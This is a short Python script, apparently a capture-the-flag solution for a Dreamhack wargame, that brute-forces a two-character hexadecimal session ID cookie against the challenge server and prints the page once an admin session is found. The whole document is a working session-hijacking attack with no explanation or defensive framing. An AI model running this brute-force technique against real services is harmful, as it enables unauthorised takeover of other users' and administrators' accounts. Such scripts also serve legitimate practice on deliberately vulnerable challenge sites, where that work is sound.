import requests
url = 'http://host3.dreamhack.games:18757/'
a = '0123456789abcdef'
for i in a:
    for j in a:
        headers = {'Cookie': f'sessionid={i}{j}'}
        response = requests.get(url, headers=headers)
        if 'admin' in response.content.decode('utf-8'):
            print(response.content.decode('utf-8'))
            print(i, j)
            break
print('ass')
